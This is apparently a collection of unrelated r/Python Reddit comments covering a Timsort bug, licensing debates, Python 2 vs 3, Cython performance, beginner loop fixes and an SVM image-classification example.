In plain English, it's "possible" to construct an input to `sorted` that will cause Python to crash. I say "possible", because the input must be very, *very* large in order to cause a crash. More than 2^49 entries, large. There (probably) isn't a computer in the world that has enough memory to store a list of that size, anyways, so it's not especially concerning. With Java, it's much more concerning, because their implementation of the algorithm is susceptible to a crash for smaller input sizes. In fact, the authors provide some code that you can download and run on your laptop to demonstrate the issue. In summary, though, there's nothing to be worried about with Python because the bug can't be exploited in practice, unless you happen to have a computer with 500 terabytes of memory.
I definitely learned about other uses and applications as well! I have used kriging for the evaluation of mineral deposits where only limited (and incredibly expensive) drilling data is available. From this perspective the application of kriging is generally to calculate expected values in 3D space rather than optimize sample location. Selecting the neighbourhood is one aspect of optimizing the usage of that limited data! I really like the infill tools you have built in and think they could have very cool infill drilling location optimization applications. I will definitely be checking them out further! 
No - the flaw they found would only cause a problem with a bigger list than you can possibly create on your computer. So for now, it's a pretty theoretical problem for Python, and I imagine it will get fixed long before computers become powerful enough that anyone is affected. It's intellectually interesting, though. The message I take away is that even for something as well understood as sorting an array of numbers, even in a really widely used piece of code (part of both Python and Java), there was still a bug lurking. So all the code we're writing probably has far more bugs!
OK, great! I was really in love with OOP for a while, it was just so much fun to build these class hierarchies and make little simulations and stuff :) One feature I always wanted to use, but never perfected is the randomized stats I mentioned before. You could try something like: 1. Provide each monster class with static (i.e. belonging to the class, not objects) functions, which when called will return a randomized stat appropriate for that kind of monster. 2. In the init method of the class call these functions when setting monster stats so that all created monsters are different from one another, yet similar because they are of the same kind. So let's say you have the class "Kobold" with the stats `speed`, `strength`, and `health`. Then define the methods `Kobold.speed()`, `Kobold.strength()`, `Kobold.health()`, something like (sorry, my Python is a bit rusty, might not be actual syntax): def Kobold.speed return value_between(7,10) # kobolds are fast def Kobold.strength return value_between(2,4) # … but they are rather weak def Kobold.health return value_between(3,5) # … and also not too high in health Assume that `value_between(low, high)` yields a number in that range, either by calling `rand()`, or by using an actual distribution, like the normal distribution. Again, by abstracting the actual mechanism we can make that decision / refinement later. Then the initialization would be something like: def Kobold.__init__ self.speed = Kobold.speed(); self.strength = Kobold.strength(); self.health = Kobold.health(); And there you have it! All you have to do is tweak the `low` and `high` values inside the static methods for each class and you can play with the makeup of your monster population ;)
I'd be happy to help more, but it's not very efficient this way… Anyways, feel free to ask me now or in the future. I'll do my best :)
If you're doing it for the money, get into banking or something. Very similar skillset and a lot more cash. Why the hell would a smart guy work at something he wasn't happy with if the pay was shit? Sometimes people get trapped into thinking that just because they have a CS Degree they are compelled to write programs, then get stuck using some language that makes them sad for the rest of their life.
This is all great feedback! Thank you so much!
It'd be nice to understand how this compares with [Crossbar.io](http://crossbar.io/).
How about a nice web app?
I had a few problems getting nginx + uwsgi + virtualenv + flask working. Though once I did its been great. See http://stackoverflow.com/a/27221427/567606
My hand tipped towards nginx for the following reason... 1. Having a cloud instance VPS rather than being on a shared host means .htaccess is a non-issue. 2. Being light on cash means lower-end cloud instances means more limited resources. Nginx seems to be kinder with respect to those resources. 3. Configuration seems fairly simple from tutorials I've sen thus far. 4. Nginx apparently knows how to speak uWSGI apparently. https://www.digitalocean.com/community/tutorials/apache-vs-nginx-practical-considerations. 
Thanks for the heads up. It should help me navigate the learning curve.
This might not answer your question, but have you looked into mechanize? 
Noob comment: how do I repost?
http://lmgtfy.com/?q=selenium+run+headless
GPL3 is compatible with MIT/BSD, so there is no problem here. Edit: but GPL2 is not. OP, you should definitely change the license to whether GPL3 or something less restrictive like MIT.
Head over to /r/learnpython, make a new self post, and copy the text from your first post if you don't feel like writing it again.
This looks very interesting. Could be useful for some things I am working on.
/r/learnpython
The reason you are not seeing anything print out after you input your guess is because you have an infinite loop in this section while i &lt; len(G): if G[i] == C[i]: ExactMatches = ExactMatches + 1 i = i + 1 If you don't find a match, you are never incrementing your counter and it will never leave that loop and just check the same two values over and over again. I would suggest you use something like this instead: for x in range(len(G)): if G[x] == C[x]: ExactMatches = ExactMatches + 1
I guess the `finally` clause wins.
The rule for finally clauses is that the finally clause **always** executes. 
according to the **stickied post at the top of this sub.....** this post is better suited for /r/learnpython http://www.reddit.com/r/Python/comments/2voohz/homework_learning_and_posts_on_rpython/
according to the ***stickied post*** at the top of this sub..... this post is better suited for /r/learnpython http://www.reddit.com/r/Python/comments/2voohz/homework_learning_and_posts_on_rpython/
according to the **stickied post** at the top of this sub..... this post is better suited for /r/learnpython http://www.reddit.com/r/Python/comments/2voohz/homework_learning_and_posts_on_rpython/
You could try [OpenCV](http://opencv.org/).
I've read a bit into it, but can it figure out if I can use it to real-time image processing, like while the replay is running.
according to the **stickied post** at the top of this sub..... this post is better suited for /r/learnpython http://www.reddit.com/r/Python/comments/2voohz/homework_learning_and_posts_on_rpython/
&gt;Could someone put this into plain English for Python users? This is an interestingly worded question, at least to me. Is there now a real difference between a Python 'user' and Python programmer? 
Thank you! I fixed the exact matches and now I am having an error with the partial matches, index is too far. while i &lt;= len(G): j = 0 while j &lt;= len(G): if Computer[i] == G[j]: PartialMatches = PartialMatches + 1 Computer[i] = X G[j] = x j = j + 1 i = i + 1 
Cool report. Anything like a roadmap that would help some of us get a sense of about what point in time we might be able to use it?
&gt; GPL3 is compatible with MIT/BSD, so there is no problem here. I don't quite see how that's possible. How do you incorporate GPL3 code into a BSD/MIT project without re-licensing the BSD/MIT project (and, more importantly, any non-BSD/non-MIT derived works that use that BSD/MIT project) as GPL3? I can see it the other way around (a GPL3 project using BSD/MIT code), but if I understood correctly, the GPL complainer was talking about integrating the GPL code into a BSD/MIT project.
Isn't it a lot better to analyze the replay files themselves? Otherwise you might want to look at this: https://github.com/yerich/LOLReplayAnalyser
Hi there. You have posted a beginners question to /r/python, however it is far more suited to /r/learnpython, where users are actively interested in helping with beginner topics. Please resubmit it over there! Make sure to read their sidebar rules before posting, notably this one: "Posting homework assignments is not prohibited if you show that you tried to solve it yourself." Cheers &amp;amp; best of luck!
Maybe this can help him realize the Python power https://github.com/blink1073/oct2py
python is BEST for competitive programming, it helps you in framing your idea in a simple manner however complex the idea is.. Most of the competitive programming sites are now keeping variable time limits. Although other scripting languages also have the same features, python is closer to humans(sane people's ideology..)
Hi there. You have posted a beginners question to /r/python, however it is far more suited to /r/learnpython, where users are actively interested in helping with beginner topics. Please resubmit it over there! Make sure to read their sidebar rules before posting, notably this one: "Posting homework assignments is not prohibited if you show that you tried to solve it yourself." Cheers &amp;amp; best of luck!
Good job.
Thanks I made some initial commits! more to come
I've spent dozens of hours talking to coworkers about python, but the minutes I've spent actually showing them what I've produced have done a lot more to demonstrate Python's advantages. Of course they all still use Matlab so what do I know... It's also important to realize the need that MATLAB is meeting for them. Given the right requirements and resources it really might be the best tool for certain jobs. Imagine one of them was trying to convince you to use Julia... would your arguments for Python sound anything like their arguments for MATLAB? Put yourself in their shoes to help empathize with them.
This is fantastic. Exactly the kind of accessible thing I need to help out with my Python hobby!
Unicode is about the only reason I might switch to 3, tbh. Having to add loads of error handing, and such, for wierd unicode bullshit is one of the most infuriating things about writing web client utilities in Python2.
The real problem here is that the library in question (not OP's library) is MIT licensed. Linking a GPL3 library into an MIT licensed library causes all kinds of headaches, especially for non-MIT code linking the MIT library. At best, it could be optionally linked. In the case being discussed here, providing optional features that require the use of a GPL3 library would cause more problems than it would solve.
I strongly urge you to consider a more permissive license. Any version of GPL basically guarantees that your library cannot be used by many open source projects. At best, they can optionally depend on your code. In most cases, though, they'll look for, or write, a more freely-licensed alternative.
You can define multiple functions in a single file and import them into your program. 
Have you thought about running this in a VM so that way your script is isolated from what you're doing on your main desktop but you can just log into the VM to see what its doing?
Does anyone know a similar article about Cython+Numba combination? I'm kinda new to this area and I wrote a Cython function (completly typed, using cython decorators like wraparounds/boundscheck etc.) which seems already pretty optimized to me. However, when I only removed the static types and applied numba's autojit, it was 30% faster than my Cython function although both are pretty much the same. I dont know why or how this is possible. The problem now is that this was a function in a whole class that I've already written in Cython, so to use the Numba's version of this function in my Cython class, I had to change some types (e.g. from 'int[:,:] data' to 'data'). But by doing this, my whole Cython implementation lost performance, so in the end I didn't gain any speedup. Since I'm new to this, I probably made some mistakes. I would like to know how to do this better.
Alternatively: - Use Python 3 - https://pypi.python.org/pypi/unicode-nazi
Really?You must have found a good job I think.
according to the **stickied post** at the top of this sub..... this post is better suited for /r/learnpython http://www.reddit.com/r/Python/comments/2voohz/homework_learning_and_posts_on_rpython/
[what you want to google](https://www.google.com.au/webhp?ie=UTF-8#q=python%20windows%20emulate%20keyboard)
Did you try compiling the Cython code with the ``-a`` flag, so that you can check when Cython is calling back into Python? This is a very important step for determining which parts of your code are running in 'Pure C' and which parts are actually just 'Typed Python'.
First show him how to use ipython with octave. Then start to exchange data between python and octave back and forth, thereby taking advantage of both worlds. Then, it will still be a matter of taste. Python, Matlab, it's only hammers. If your choice fits your nail well, then good, that's it. Maybe your colleagues will prefer Matlab because they are more productive with it since they know it better. kind regards Thierry
Thanks for your reply. Yes, I did this and the only pythonic lines (i.e. the yellow lines) are zero-array-allocations like 'cdef int[:] array = np.zeros(n, dtype = np.int)', everything is else is 'pure C'.
virtualenvwrapper-win is also nice - it can be installed with chocolatey (though when I last tried it also installed django, weirdly). 
Every day, in every way, it's getting better and better.
You mean "a non-broken type system". Python 2 has a type system, it just happens to be broken in this specific instance. Python 3 is good though.
Should I upgrade from Python 2 now. Could you indicate some of the advantages and disadvantages for me? 
http://www.reddit.com/r/Python/comments/22ovb3/what_are_the_advantages_to_python_3x/ but honestly, the only reason you stick to python2 is if there is a library that you are using right now that is only available in python2 and you can't live without it. 
...or you are forced to work on a machine that doesn't have Python 3.x installed and your sysadmin won't change it.
https://wiki.python.org/moin/Python2orPython3
If you rely on a Py2 exclusive library it's not such a bad thing. 
DOES HOST ADMIN LOOK LIKE A BITCH
You can also do that in Matlab.
I'm using pyodbc for SQL Server access, Python's own csv module for flat files, and the xml.parsers.expat module for XML processing. All for a trade reconciliation service.
Use an svm, either from OpenCV or lib svm. Here is an example using lib svm. set up a list of labels and a list of patterns of your training set (data spread and normalized.), import svm as svm import svmutil as svmutil from PIL import Image pat = [] lab = [] for i in glob.glob('c:\\python27\\Faces\\Tom\\*.jpg'): trainlist = [] animage = Image.open(i) pdata = animage.getdata() for i in pdata: trainlist.append(i[0]/255.) trainlist.append(i[1]/255.) trainlist.append(i[2]/255.) lab.append(1001) pat.append(trainlist) for i in glob.glob('c:\\python27\\Faces\\Atlantis\\*.jpg'): trainlist = [] animage = Image.open(i) pdata = animage.getdata() for i in pdata: trainlist.append(i[0]/255.) trainlist.append(i[1]/255.) trainlist.append(i[2]/255.) lab.append(1002) pat.append(trainlist) set up your problem, parameters and model, problem = svmutil.svm_problem(lab, pat) param = svm.svm_parameter('-s 3 -c 0.5 -g 0.000244140625') model = svmutil.svm_train(problem, param) Query the svm with some image, pdata = Imagenow.getdata() pat = [] trainlist = [] for i in pdata: trainlist.append(i[0]/255.) trainlist.append(i[1]/255.) trainlist.append(i[2]/255.) mainlist.append(trainlist) labels2 ={1001:'Tom',1002:'Atlantis'} x0, max_idx = svm.gen_svm_nodearray(patt[0]) label = svm.libsvm.svm_predict(model, x0) print labels2[int(round(label))] The key to good pattern recognition is to have the svm parameters set right for this svm kernel. We need to look at C and g, so we do a grid search to find the best values, labels, pat = gettrainimg() #get lab and pat of training set problem = svmutil.svm_problem(labels, pat) zmat = [] for i in range(-15,5): grid = [] for j in range(-14,2): param = svm.svm_parameter('-s 3 -c ' + str(2**i) + ' -g ' + str(2**j) + ' -p 1') model = svmutil.svm_train(problem, param) fit = 0 errors = 0 l,p = gettestimg() #get lab and pat of a seperated test group pred_label, p_acc, pred_probability = svmutil.svm_predict(l,p, model) for lablenum in range(len(l)): if int(pred_label[lablenum]) != l[lablenum]: errors += 1 else: fit += pred_probability[lablenum][0] fit += (len(l) - errors) grid.append(fit) zmat.append(grid) if you were to graph zmat with &gt; (20,20) data points it would look like a fractal with plateaus of high recognition and valleys of low recognition. Start course and work fine to find the best. 
From PEP 456: &gt; Hash maps have a worst case of O(n) for insertion and lookup of keys. This results in a quadratic runtime during a hash collision attack. The introduction of a new and additional data structure with with O(log n) worst case behavior would eliminate the root cause. A data structures like red-black-tree or prefix trees (trie [trie] ) would have other benefits, too. Prefix trees with stringed keyed can reduce memory usage as common prefixes are stored within the tree structure. I'm still waiting for a sorted dict structure. While niche, it has its applications - in particular, efficient lookup of the nearest key or a range of keys. It would also be for elegantly implementing a general purpose radix sort (although for typical radix sizes, I imagine that it wouldn't actually help with performance).
Well, Python does have ordered dictionary (Python 3.2+, and maybe in py2.7). https://docs.python.org/3/library/collections.html#collections.OrderedDict . I am not sure about the big O guarantees though -- wish docs had it written next to each method.
whoo hoo `statistics` module. no more importing `numpy` or creating your own average function to calculate a simple mean.
As someone who is trying to learn python, Code academy is amazing but it's using python 2 for everything. =(
I posted this in /r/learnpython but didn't get any feedback so I figured I'd try here
I don't expect that to ever be found in Python's stdlib. Python has historically added only few data structures to the stdlib, adding a new one once every year or so. For example, sets were only added in Python 2.3; deque in 2.4; defaultdict in 2.5; namedtuple in 2.6; OrderedDict and Counter in 2.7. If you *really* want it, just implement a sorted dict library or help develop and existing one. If it becomes widely used, it could then more reasonably be considered for inclusion in the stdlib.
Which version of RHEL and Python? Python is integrated into yum so while you can set up a second python environment on a machine for your apps, most IT teams don't like doing that for maintenance reasons so they limit you to whatever are in the available repos. Rhel doesn't include any further build of python in the repo than the one that yum uses because yum will break. I believe RHEL 6 used Python 2.7 which is the reason that those dev teams would be stuck on on older version.